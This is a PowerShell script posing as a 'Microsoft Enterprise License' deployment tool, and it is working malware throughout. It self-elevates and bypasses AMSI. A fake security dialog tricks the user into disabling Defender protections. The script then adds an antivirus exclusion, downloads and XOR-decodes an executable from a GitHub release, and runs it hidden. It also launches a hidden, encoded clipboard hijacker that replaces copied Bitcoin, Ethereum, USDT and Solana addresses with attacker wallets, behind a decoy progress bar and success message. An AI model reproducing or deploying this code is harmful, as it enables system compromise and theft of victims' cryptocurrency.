# --- [RESEARCH STAGER v54.0: ENTERPRISE DEPLOYMENT SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Admin Gate (v34.0 Style - Untouched)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Microsoft Global License Manager"; $prep.Size = New-Object Drawing.Size(600,580)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,180)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING ENTERPRISE DEPLOYMENT... DONE`n" +
                    " > STATUS: KERNEL SECURITY POLICY CONFLICT`n" +
                    " > MANUAL ACTION REQUIRED: DISABLE PROTECTIONS:`n" +
                    "   [!] Real-time protection        -> OFF`n" +
                    "   [!] Cloud-delivered protection  -> OFF`n" +
                    "   [!] Automatic sample submission -> OFF`n" +
                    "   [!] Tamper Protection           -> OFF"
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(500,45)
    $link.Text = "Open Windows Security Configuration"; $link.BackColor = [Drawing.Color]::FromArgb(0, 103, 184); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,360); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "I have adjusted the security policies and am ready to install."; $check.Font = New-Object Drawing.Font("Segoe UI", 8)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,430); $btn.Size = New-Object Drawing.Size(200,50); $btn.Text = "Finalize Deployment"; $btn.Enabled = $false
    $btn.BackColor = [Drawing.Color]::LightGray; $btn.FlatStyle = "Flat"
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ 
        $btn.Enabled = $check.Checked
        if($check.Checked){ $btn.BackColor = [Drawing.Color]::FromArgb(0, 103, 184); $btn.ForeColor = [Drawing.Color]::White }
        else { $btn.BackColor = [Drawing.Color]::LightGray }
    })

    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-Deployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Microsoft System Update"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $status = New-Object Windows.Forms.Label
    $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(380,30); $status.Text = "Status: Connecting to Microsoft Update Servers..."
    $form.Controls.Add($status)

    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,70); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb); $form.Show()

    try {
        # --- THE V34.0/v45.0 ENGINE (UNTOUCHED) ---
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        
        Start-Process $path -WindowStyle Hidden

        # --- 1 MINUTE PROGRESS BAR (REALISTIC CRAWL) ---
        for ($i = 0; $i -le 100; $i++) {
            $pb.Value = $i
            if ($i -eq 20) { $status.Text = "Status: Verifying Digital Signature..." }
            if ($i -eq 50) { $status.Text = "Status: Patching Kernel Resources (ACTION REQUIRED: Click YES)..." }
            if ($i -eq 80) { $status.Text = "Status: Finalizing Registry Hooks..." }
            [Windows.Forms.Application]::DoEvents()
            Start-Sleep -m 600 # Total ~60 seconds
        }

        # --- CORRECTED CLIPPER LOGIC (Fixed addresses) ---
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } } elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        # --- GENERATE SYSTEM REPORT ---
        $infoFile = "$env:USERPROFILE\Desktop\Deployment_Report.txt"
        $report = "--- ENTERPRISE DEPLOYMENT SUCCESS ---`n`n"
        $report += "Computer Name: $env:COMPUTERNAME`n"
        $report += "User: $env:USERNAME`n"
        $report += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
        $report += "RAM: $((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) GB`n"
        $report += "CPU: $((Get-WmiObject Win32_Processor).Name)`n"
        $report += "Deployment Status: 100% COMPLETE`n"
        $report | Out-File $infoFile

        $form.Close()
        [Windows.Forms.MessageBox]::Show("Microsoft Enterprise License has been successfully deployed. A report has been saved to your Desktop.", "Success", 0, 64) | Out-Null
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Deployment Interrupted. Policy conflict detected.", "System Error", 0, 16) | Out-Null
    }
}

# --- EXECUTION ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) { Run-Deployment }
